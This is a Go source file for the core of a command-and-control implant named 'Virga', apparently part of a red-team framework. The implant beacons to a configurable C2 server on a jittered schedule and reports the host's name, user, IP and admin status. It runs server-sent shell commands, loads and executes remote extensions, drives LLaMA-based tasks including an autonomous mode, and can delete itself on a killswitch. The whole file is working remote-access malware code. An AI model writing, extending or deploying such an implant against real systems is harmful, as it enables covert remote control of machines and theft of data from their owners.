package core

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/r74tech/virga/internal/implant/config"
	"github.com/r74tech/virga/internal/implant/extensions"
	"github.com/r74tech/virga/internal/implant/llama"
	"github.com/r74tech/virga/internal/implant/logger"
	"github.com/r74tech/virga/internal/implant/memdb"
	"github.com/r74tech/virga/internal/implant/transport"
	"github.com/r74tech/virga/internal/shared/protocol"
)

// Implant is the main agent structure
type Implant struct {
	Config      *config.Config
	Transport   transport.Transport
	Modules     map[string]Module
	Environment map[string]string
	DB          *memdb.DB

	// Task management
	pendingResults []protocol.AgentTaskResult
	resultsMutex   sync.Mutex

	// State management
	isInteractive bool
	bootTime      int64

	// Extension management
	ExtensionManager *extensions.Manager
}

// Module is the implant module interface
type Module interface {
	Name() string
	Execute(args []string) (string, int, error)
}

// NewImplant creates a new implant
func NewImplant(cfg *config.Config, t transport.Transport) *Implant {
	// Generate Agent ID
	id := make([]byte, 16)
	rand.Read(id)
	cfg.AgentID = fmt.Sprintf("%x-%x-%x-%x-%x", id[0:4], id[4:6], id[6:8], id[8:10], id[10:])

	// Generate AES key (32 bytes using SHA-256 hash)
	originalKey := "change-this-key-in-production-environment"
	hasher := sha256.New()
	hasher.Write([]byte(originalKey))
	cfg.AESKey = hasher.Sum(nil)

	// Initialize in-memory database
	db, err := memdb.New()
	if err != nil {
		if log := logger.Get(); log != nil {
			log.Error("Failed to initialize memdb", map[string]interface{}{
				"error": err.Error(),
			})
		}
		// Continue without memdb if initialization fails
	}

	implant := &Implant{
		Config:      cfg,
		Transport:   t,
		Modules:     make(map[string]Module),
		Environment: collectEnvironment(),
		bootTime:    time.Now().Unix(),
		DB:          db,
	}

	// Initialize extension manager with callbacks
	callbacks := &extensions.ExtensionCallbacks{
		SendOutput: func(output string) error {
			// This will be properly implemented to send output to C2
			if log := logger.Get(); log != nil {
				log.Info("Extension output", map[string]interface{}{
					"output": output,
				})
			}
			return nil
		},
		SendError: func(err error) error {
			if log := logger.Get(); log != nil {
				log.Error("Extension error", map[string]interface{}{
					"error": err.Error(),
				})
			}
			return nil
		},
		GetEnv:   os.Getenv,
		SetEnv:   os.Setenv,
		ReadFile: os.ReadFile,
		WriteFile: func(path string, data []byte) error {
			return os.WriteFile(path, data, 0o644)
		},
		ExecuteCommand: func(command string, args []string) (string, error) {
			// Use the shell module if available
			if shellModule, exists := implant.Modules["shell"]; exists {
				cmdStr := command
				if len(args) > 0 {
					cmdStr = fmt.Sprintf("%s %s", command, strings.Join(args, " "))
				}
				output, _, err := shellModule.Execute([]string{cmdStr})
				return output, err
			}
			return "", fmt.Errorf("shell module not available")
		},
		Log: func(level, message string, fields map[string]interface{}) {
			log := logger.Get()
			switch level {
			case "debug":
				log.Debug(message, fields)
			case "info":
				log.Info(message, fields)
			case "warn":
				log.Warn(message, fields)
			case "error":
				log.Error(message, fields)
			}
		},
		GetSystemInfo: func() map[string]interface{} {
			return map[string]interface{}{
				"os":       runtime.GOOS,
				"arch":     runtime.GOARCH,
				"hostname": implant.Environment["hostname"],
				"username": implant.Environment["username"],
				"pid":      implant.Environment["pid"],
			}
		},
	}

	implant.ExtensionManager = extensions.NewManager(callbacks)

	// Set memdb on Llama integration if both are available
	if db != nil && llama.IsLlamaAvailable() {
		llama.SetMemDB(db)
	}

	// Set partial result callback once for all Llama tasks
	if llama.IsLlamaAvailable() {
		if llamaIntegration := llama.GetLlamaIntegration(); llamaIntegration != nil {
			llamaIntegration.SetPartialResultCallback(func(taskID, output string) {
				if log := logger.Get(); log != nil {
					log.Debug("Partial result callback invoked", map[string]interface{}{
						"task_id":    taskID,
						"output_len": len(output),
					})
				}

				partialResult := protocol.AgentTaskResult{
					TaskID:    taskID,
					Output:    output,
					ExitCode:  0,
					Timestamp: time.Now().Unix(),
					Partial:   true, // Mark as partial result
				}
				implant.resultsMutex.Lock()
				implant.pendingResults = append(implant.pendingResults, partialResult)
				if log := logger.Get(); log != nil {
					log.Debug("Partial result added to pending queue", map[string]interface{}{
						"task_id":      taskID,
						"queue_length": len(implant.pendingResults),
					})
				}
				implant.resultsMutex.Unlock()
			})

			// Set final result callback for sending final report
			llamaIntegration.SetFinalResultCallback(func(taskID, output string) {
				if log := logger.Get(); log != nil {
					log.Debug("Final result callback invoked", map[string]interface{}{
						"task_id":    taskID,
						"output_len": len(output),
					})
				}

				finalResult := protocol.AgentTaskResult{
					TaskID:    taskID,
					Output:    output,
					ExitCode:  0,
					Timestamp: time.Now().Unix(),
					Partial:   false, // Mark as final result (NOT partial)
				}
				implant.resultsMutex.Lock()
				implant.pendingResults = append(implant.pendingResults, finalResult)
				if log := logger.Get(); log != nil {
					log.Debug("Final result added to pending queue", map[string]interface{}{
						"task_id":      taskID,
						"queue_length": len(implant.pendingResults),
					})
				}
				implant.resultsMutex.Unlock()
			})
		}
	}

	return implant
}

// RegisterModule registers a module
func (i *Implant) RegisterModule(module Module) {
	i.Modules[module.Name()] = module
}

// Run executes the implant main loop
func (i *Implant) Run() {
	log := logger.Get()

	log.Info("Virga Agent starting", map[string]interface{}{
		"agent_id": i.Config.AgentID,
	})
	log.Info("C2 Server configured", map[string]interface{}{
		"c2_server": fmt.Sprintf("%s://%s:%s/%s",
			i.Config.C2Protocol, i.Config.C2Host, i.Config.C2Port, i.Config.C2Path),
	})

	sleepTime, _ := strconv.Atoi(i.Config.SleepTime)
	jitter, _ := strconv.Atoi(i.Config.Jitter)

	log.Info("Beacon interval configured", map[string]interface{}{
		"sleep_time": sleepTime,
		"jitter":     jitter,
	})

	// Log configuration information
	log.Info("Implant main loop started", map[string]interface{}{
		"agent_id":   i.Config.AgentID,
		"c2_server":  fmt.Sprintf("%s://%s:%s/%s", i.Config.C2Protocol, i.Config.C2Host, i.Config.C2Port, i.Config.C2Path),
		"sleep_time": sleepTime,
		"jitter":     jitter,
	})

	// Main beacon loop
	for {
		// Collect environment information
		info := i.collectInfo()

		// Prepare beacon message
		msg := i.prepareBeaconMessage(info)

		// Send to server and get response
		log.LogBeacon("outbound", "sending", map[string]interface{}{
			"tasks_pending": len(i.pendingResults),
		})

		response, err := i.Transport.SendBeacon(msg)
		if err != nil {
			log.Error("Communication error", map[string]interface{}{
				"error": err.Error(),
			})
			log.Error("Beacon communication failed", map[string]interface{}{
				"error": err.Error(),
			})
			log.LogBeacon("outbound", "failed", map[string]interface{}{
				"error": err.Error(),
			})
			// Use default sleep time on error
			i.sleep(sleepTime, jitter)
		} else {
			// Log beacon success
			log.LogBeacon("inbound", "success", map[string]interface{}{
				"tasks_received": len(response.Tasks),
				"interactive":    response.Interactive,
				"reconnect_time": response.ReconnectTime,
				"session_id":     response.SessionID,
			})

			// Configure LLaMA integration with server info if session ID is provided
			if response.SessionID != "" && llama.IsLlamaAvailable() {
				if llamaIntegration := llama.GetLlamaIntegration(); llamaIntegration != nil {
					serverURL := fmt.Sprintf("%s://%s:%s",
						i.Config.C2Protocol, i.Config.C2Host, i.Config.C2Port)
					llamaIntegration.SetServerInfo(serverURL, response.SessionID)
					log.Debug("Configured LLaMA progress reporting", map[string]interface{}{
						"server_url": serverURL,
						"session_id": response.SessionID,
					})
				}
			}

			// Process tasks
			i.processTasks(response.Tasks)

			// Update interactive mode
			i.isInteractive = response.Interactive

			// Use server-provided reconnect time if available, otherwise use config
			actualSleepTime := sleepTime
			if response.ReconnectTime > 0 {
				actualSleepTime = response.ReconnectTime
				log.Debug("Using server-provided reconnect time", map[string]interface{}{
					"reconnect_time": actualSleepTime,
				})
			}
			i.sleep(actualSleepTime, jitter)
		}
	}
}

// collectInfo collects environment information
func (i *Implant) collectInfo() protocol.SystemInfo {
	hostname, _ := os.Hostname()
	u, _ := user.Current()

	return protocol.SystemInfo{
		Hostname:  hostname,
		Username:  u.Username,
		OS:        runtime.GOOS + "/" + runtime.GOARCH,
		PID:       os.Getpid(),
		IsAdmin:   isAdmin(),
		Timestamp: time.Now().UTC(),
	}
}

// prepareBeaconMessage prepares the beacon message
func (i *Implant) prepareBeaconMessage(info protocol.SystemInfo) *protocol.AgentMessage {
	i.resultsMutex.Lock()
	defer i.resultsMutex.Unlock()

	msg := &protocol.AgentMessage{
		AgentID:  i.Config.AgentID,
		Hostname: info.Hostname,
		Username: info.Username,
		OS:       info.OS,
		Version:  "1.0.0",
		IP:       getLocalIP(),
		BootTime: i.bootTime,
		Environment: map[string]interface{}{
			"arch":     runtime.GOARCH,
			"os":       runtime.GOOS,
			"pid":      info.PID,
			"is_admin": info.IsAdmin,
		},
		TaskResults: i.pendingResults,
	}

	// Clear after sending
	if len(i.pendingResults) > 0 {
		i.pendingResults = nil
	}

	return msg
}

// processTasks processes tasks received from server
func (i *Implant) processTasks(tasks []protocol.Task) {
	log := logger.Get()

	for _, task := range tasks {
		// Log task start
		log.LogTask(task.TaskID, task.Type, "started")
		// Store task in memdb
		if i.DB != nil {
			payloadData, _ := json.Marshal(task.Payload)
			i.DB.StoreServerTask(task.Type, string(payloadData))
		}

		result := i.executeTask(task)

		i.resultsMutex.Lock()
		i.pendingResults = append(i.pendingResults, result)
		i.resultsMutex.Unlock()

		log.Info("Task execution complete", map[string]interface{}{
			"task_id":   task.TaskID,
			"task_type": task.Type,
			"exit_code": result.ExitCode,
		})

		// Log task completion
		log.LogTask(task.TaskID, task.Type, "completed", map[string]interface{}{
			"exit_code": result.ExitCode,
			"has_error": result.Error != "",
		})
	}
}

// executeTask executes individual tasks
func (i *Implant) executeTask(task protocol.Task) protocol.AgentTaskResult {
	log := logger.Get()

	result := protocol.AgentTaskResult{
		TaskID:    task.TaskID,
		Timestamp: time.Now().Unix(),
		Partial:   false, // Default: final result (will be overridden for async Llama tasks)
	}

	// Process Llama tasks (asynchronous execution)
	if strings.HasPrefix(task.Type, "llama_") &&
		task.Type != "llama_status" &&
		task.Type != "llama_list_tasks" &&
		task.Type != "llama_cancel" &&
		task.Type != "llama_autonomous" {
		// Mark as partial since actual results will come via callbacks
		result.Partial = true

		if llamaIntegration := llama.GetLlamaIntegration(); llamaIntegration != nil {
			log.LogTask(task.TaskID, task.Type, "llama_async_start")

			// Execute Llama task asynchronously
			go func() {
				payloadData, _ := json.Marshal(task.Payload)
				req := protocol.Request{
					ID:   task.TaskID,
					Type: task.Type,
					Data: payloadData,
				}

				// Store llama interaction before execution
				var prompt string
				var temperature float32 = 0.3 // default temperature
				if payload, ok := task.Payload.(map[string]interface{}); ok {
					if p, exists := payload["prompt"]; exists {
						prompt = fmt.Sprintf("%v", p)
					}
					if t, exists := payload["temperature"]; exists {
						if tempFloat, ok := t.(float64); ok {
							temperature = float32(tempFloat)
						}
					}
				}

				// Store task start in memdb
				if i.DB != nil && prompt != "" {
					i.DB.StoreLlamaTaskStart(task.TaskID, prompt, task.Type, temperature)
				}

				// Record task execution start
				log.Info("Llama task started in background", map[string]interface{}{
					"task_id": task.TaskID,
				})
				log.LogTask(task.TaskID, task.Type, "llama_executing", map[string]interface{}{
					"prompt":      prompt,
					"temperature": temperature,
				})

				resp := llamaIntegration.ProcessRequest(req)

				// Check if the request was rejected immediately
				if resp.Status == protocol.StatusError && resp.Error == "Llama is already running. Please wait for the current task to complete or cancel it." {
					// Don't save this as a result, just log error message
					log.Warn("Llama task rejected", map[string]interface{}{
						"task_id": task.TaskID,
						"error":   resp.Error,
					})
					return
				}

				// Note: StoreLlamaInteraction is already called inside ProcessRequest
				// so we don't need to call it again here

				// Save result (mark as partial since actual results come via callbacks)
				asyncResult := protocol.AgentTaskResult{
					TaskID:    task.TaskID,
					Timestamp: time.Now().Unix(),
					Output:    string(resp.Data),
					Partial:   true, // This is just a "queued" message, actual results via callbacks
				}

				if resp.Status == protocol.StatusSuccess {
					asyncResult.ExitCode = 0
				} else {
					asyncResult.ExitCode = 1
					asyncResult.Error = resp.Error
				}

				// Add result to queue
				i.resultsMutex.Lock()
				i.pendingResults = append(i.pendingResults, asyncResult)
				i.resultsMutex.Unlock()

				// Log appropriate message based on result
				if asyncResult.ExitCode == 0 {
					log.Info("Llama task completed successfully", map[string]interface{}{
						"task_id": task.TaskID,
					})
				} else {
					log.Error("Llama task failed", map[string]interface{}{
						"task_id": task.TaskID,
						"error":   asyncResult.Error,
					})
				}

				log.LogTask(task.TaskID, task.Type, "llama_completed", map[string]interface{}{
					"exit_code": asyncResult.ExitCode,
					"has_error": asyncResult.Error != "",
				})
			}()

			// Return "processing" response immediately
			result.Output = fmt.Sprintf("Llama task %s started in background. Use 'llama status' to check progress.", task.TaskID)
			result.ExitCode = 0
			return result
		} else {
			result.Output = "Llama integration not available"
			result.ExitCode = 1
			result.Error = "llama_not_initialized"
			return result
		}
	}

	// Llama status is executed synchronously
	if task.Type == "llama_status" {
		if llamaIntegration := llama.GetLlamaIntegration(); llamaIntegration != nil {
			payloadData, _ := json.Marshal(task.Payload)
			req := protocol.Request{
				ID:   task.TaskID,
				Type: task.Type,
				Data: payloadData,
			}

			resp := llamaIntegration.ProcessRequest(req)

			result.Output = string(resp.Data)
			if resp.Status == protocol.StatusSuccess {
				result.ExitCode = 0
			} else {
				result.ExitCode = 1
				result.Error = resp.Error
			}
			return result
		} else {
			result.Output = "Llama integration not available"
			result.ExitCode = 1
			result.Error = "llama_not_initialized"
			return result
		}
	}

	// Llama list tasks is executed synchronously
	if task.Type == "llama_list_tasks" {
		if llamaIntegration := llama.GetLlamaIntegration(); llamaIntegration != nil {
			payloadData, _ := json.Marshal(task.Payload)
			req := protocol.Request{
				ID:   task.TaskID,
				Type: task.Type,
				Data: payloadData,
			}

			resp := llamaIntegration.ProcessRequest(req)

			result.Output = string(resp.Data)
			if resp.Status == protocol.StatusSuccess {
				result.ExitCode = 0
			} else {
				result.ExitCode = 1
				result.Error = resp.Error
			}
			return result
		} else {
			result.Output = "Llama integration not available"
			result.ExitCode = 1
			result.Error = "llama_not_initialized"
			return result
		}
	}

	// Process extension commands
	if task.Type == "extension_load" || task.Type == "extension_upload" {
		if i.ExtensionManager == nil {
			result.Output = "Extension manager not initialized"
			result.ExitCode = 1
			result.Error = "extension_manager_not_available"
			return result
		}

		// Try to load from payload (server-sent extension)
		if err := i.ExtensionManager.LoadExtensionFromPayload(task.Payload); err != nil {
			result.Output = fmt.Sprintf("Failed to load extension: %v", err)
			result.ExitCode = 1
			result.Error = err.Error()
		} else {
			result.Output = "Extension loaded successfully"
			result.ExitCode = 0
		}
		return result
	}

	if task.Type == "extension_unload" {
		if i.ExtensionManager == nil {
			result.Output = "Extension manager not initialized"
			result.ExitCode = 1
			result.Error = "extension_manager_not_available"
			return result
		}

		name := ""
		if payload, ok := task.Payload.(map[string]interface{}); ok {
			if n, exists := payload["name"]; exists {
				name = fmt.Sprintf("%v", n)
			}
		}

		if name == "" {
			result.Output = "Extension name not specified"
			result.ExitCode = 1
			result.Error = "missing_extension_name"
			return result
		}

		if err := i.ExtensionManager.UnloadExtension(name); err != nil {
			result.Output = fmt.Sprintf("Failed to unload extension: %v", err)
			result.ExitCode = 1
			result.Error = err.Error()
		} else {
			result.Output = fmt.Sprintf("Extension '%s' unloaded", name)
			result.ExitCode = 0
		}
		return result
	}

	if task.Type == "extension_list" {
		if i.ExtensionManager == nil {
			result.Output = "Extension manager not initialized"
			result.ExitCode = 1
			result.Error = "extension_manager_not_available"
			return result
		}

		extensions := i.ExtensionManager.GetLoadedExtensions()
		if len(extensions) == 0 {
			result.Output = "No extensions loaded"
		} else {
			result.Output = fmt.Sprintf("Loaded extensions: %s", strings.Join(extensions, ", "))
		}
		result.ExitCode = 0
		return result
	}

	if task.Type == "extension_execute" {
		if i.ExtensionManager == nil {
			result.Output = "Extension manager not initialized"
			result.ExitCode = 1
			result.Error = "extension_manager_not_available"
			return result
		}

		name := ""
		args := make(map[string]interface{})
		if payload, ok := task.Payload.(map[string]interface{}); ok {
			if n, exists := payload["name"]; exists {
				name = fmt.Sprintf("%v", n)
			}
			if a, exists := payload["args"]; exists {
				if argMap, ok := a.(map[string]interface{}); ok {
					args = argMap
				}
			}
		}

		if name == "" {
			result.Output = "Extension name not specified"
			result.ExitCode = 1
			result.Error = "missing_extension_name"
			return result
		}

		extResult, err := i.ExtensionManager.ExecuteExtension(name, args)
		if err != nil {
			result.Output = fmt.Sprintf("Failed to execute extension: %v", err)
			result.ExitCode = 1
			result.Error = err.Error()
		} else {
			result.Output = extResult.Output
			result.ExitCode = extResult.ExitCode
			if extResult.Error != "" {
				result.Error = extResult.Error
			}
		}
		return result
	}

	// Process MemDB query
	if task.Type == "memdb_query" {
		if i.DB == nil {
			result.Output = "MemDB not initialized"
			result.ExitCode = 1
			result.Error = "memdb_not_available"
			return result
		}

		query := ""
		if payload, ok := task.Payload.(map[string]interface{}); ok {
			if q, exists := payload["query"]; exists {
				query = fmt.Sprintf("%v", q)
			}
		}

		// Execute MemDB query using the memdb module
		if memdbModule, exists := i.Modules["memdb"]; exists {
			args := strings.Fields(query)
			output, exitCode, err := memdbModule.Execute(args)
			result.Output = output
			result.ExitCode = exitCode
			if err != nil {
				result.Error = err.Error()
			}
		} else {
			result.Output = "MemDB module not found"
			result.ExitCode = 1
			result.Error = "memdb_module_not_registered"
		}
		return result
	}

	// Process killswitch - terminate and optionally remove the implant
	if task.Type == "killswitch" {
		mode := "shutdown"
		message := "Killswitch activated"

		if payload, ok := task.Payload.(map[string]interface{}); ok {
			if m, exists := payload["mode"]; exists {
				mode = fmt.Sprintf("%v", m)
			}
			if msg, exists := payload["message"]; exists {
				message = fmt.Sprintf("%v", msg)
			}
		}

		log.Warn("Killswitch activated", map[string]interface{}{
			"mode":    mode,
			"message": message,
		})

		if mode == "remove" {
			// Attempt self-deletion
			if err := i.selfDelete(); err != nil {
				log.Error("Self-deletion failed", map[string]interface{}{
					"error": err.Error(),
				})
				result.Output = fmt.Sprintf("Killswitch activated (removal failed: %v). Shutting down.", err)
				result.ExitCode = 1
				result.Error = err.Error()
			} else {
				log.Info("Self-deletion initiated", nil)
				result.Output = "Killswitch activated. Self-deletion initiated. Shutting down."
				result.ExitCode = 0
			}
		} else {
			result.Output = "Killswitch activated. Shutting down."
			result.ExitCode = 0
		}

		// Exit after returning the result
		go func() {
			time.Sleep(2 * time.Second)
			log.Info("Exiting due to killswitch", nil)
			os.Exit(0)
		}()

		return result
	}

	// Search and execute module
	if module, exists := i.Modules[task.Type]; exists {
		log.Debug("Executing module task", map[string]interface{}{
			"task_id": task.TaskID,
			"module":  module.Name(),
		})

		// Extract arguments from task payload
		args := extractArgs(task.Payload)
		output, exitCode, err := module.Execute(args)

		// Store command result in memdb
		if i.DB != nil {
			cmd := ""
			if len(args) > 0 {
				cmd = args[0]
			}
			errStr := ""
			if err != nil {
				errStr = err.Error()
			}
			i.DB.StoreCommandResult(cmd, args, output, errStr, exitCode, module.Name())
		}

		result.Output = output
		result.ExitCode = exitCode
		if err != nil {
			result.Error = err.Error()
		}
	} else {
		log.Warn("Unknown task type", map[string]interface{}{
			"task_id":   task.TaskID,
			"task_type": task.Type,
		})
		result.Output = fmt.Sprintf("Unsupported task type: %s", task.Type)
		result.ExitCode = -1
		result.Error = fmt.Sprintf("unknown task type: %s", task.Type)
	}

	return result
}

// sleep sleeps with jitter consideration
func (i *Implant) sleep(sleepTime, jitter int) {
	log := logger.Get()
	if i.isInteractive {
		log.Debug("Interactive mode: reconnecting in 1 second")
		time.Sleep(1 * time.Second)
		return
	}

	// Calculate jitter
	actualSleep := sleepTime
	if jitter > 0 {
		jitterRange := sleepTime * jitter / 100
		// Simple implementation: range from -jitterRange to +jitterRange
		variation := (time.Now().UnixNano() % int64(2*jitterRange+1)) - int64(jitterRange)
		actualSleep = sleepTime + int(variation)
	}

	log.Debug("Sleeping until next beacon", map[string]interface{}{
		"sleep_seconds": actualSleep,
	})
	time.Sleep(time.Duration(actualSleep) * time.Second)
}

// collectEnvironment collects environment information
func collectEnvironment() map[string]string {
	hostname, _ := os.Hostname()
	u, _ := user.Current()
	username := "unknown"
	if u != nil {
		username = u.Username
	}

	return map[string]string{
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"hostname": hostname,
		"username": username,
		"pid":      strconv.Itoa(os.Getpid()),
	}
}

// isAdmin checks if the process has admin privileges
func isAdmin() bool {
	// OS-specific implementation will be separated by build tags
	// Simple implementation for now
	if runtime.GOOS == "windows" {
		// TODO: Windows API implementation
		return false
	}
	// Unix-like systems
	return os.Getuid() == 0
}

// getLocalIP returns the non-loopback local IP address
func getLocalIP() string {
	// Enumerate network interfaces
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}

	// Prefer non-loopback IPv4 addresses
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipv4 := ipnet.IP.To4(); ipv4 != nil {
				return ipv4.String()
			}
		}
	}

	// Fallback to IPv6 if no IPv4 found
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			return ipnet.IP.String()
		}
	}

	return "unknown"
}

// extractArgs extracts arguments from task payload
func extractArgs(payload interface{}) []string {
	log := logger.Get()

	// Debug log the payload type and content
	log.Debug("extractArgs called", map[string]interface{}{
		"payload_type": fmt.Sprintf("%T", payload),
		"payload":      fmt.Sprintf("%+v", payload),
	})

	// Extract arguments based on payload format
	if m, ok := payload.(map[string]interface{}); ok {
		log.Debug("Payload is map[string]interface{}", map[string]interface{}{
			"map_content": fmt.Sprintf("%+v", m),
		})

		if args, exists := m["args"]; exists {
			log.Debug("Found args field", map[string]interface{}{
				"args_type": fmt.Sprintf("%T", args),
				"args":      fmt.Sprintf("%+v", args),
			})

			// Try []string first (direct type)
			if argList, ok := args.([]string); ok {
				log.Debug("Args is []string", map[string]interface{}{
					"args": argList,
				})
				return argList
			}
			// Try []interface{} (JSON decoded arrays)
			if argList, ok := args.([]interface{}); ok {
				result := make([]string, len(argList))
				for i, v := range argList {
					result[i] = fmt.Sprintf("%v", v)
				}
				log.Debug("Args is []interface{}, converted to []string", map[string]interface{}{
					"args": result,
				})
				return result
			}

			log.Debug("Args field exists but not array type", map[string]interface{}{
				"actual_type": fmt.Sprintf("%T", args),
			})
		} else {
			log.Debug("No args field found in payload map", nil)
		}

		// For shell commands
		if command, exists := m["command"]; exists {
			result := []string{fmt.Sprintf("%v", command)}
			log.Debug("Found command field", map[string]interface{}{
				"command": result,
			})
			return result
		}
	} else {
		log.Debug("Payload is not map[string]interface{}", map[string]interface{}{
			"actual_type": fmt.Sprintf("%T", payload),
		})
	}

	log.Debug("No args extracted, returning empty slice", nil)
	return []string{}
}
